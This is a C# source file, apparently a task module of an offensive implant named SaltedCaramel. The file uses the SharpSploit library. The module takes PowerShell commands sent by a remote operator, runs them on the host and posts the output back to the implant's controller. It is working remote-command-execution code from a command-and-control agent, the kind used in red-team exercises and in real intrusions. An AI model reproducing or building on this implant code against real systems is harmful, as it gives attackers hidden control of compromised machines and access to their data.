using Newtonsoft.Json;
using SharpSploit.Execution;
using System;
using System.Diagnostics;

namespace SaltedCaramel.Tasks
{
    class Powershell
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            string args = task.@params;

            try
            {
                string result = Shell.PowerShellExecute(args);

                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(result), task.id);
                implant.SCPostResp(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] Powershell - ERROR: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
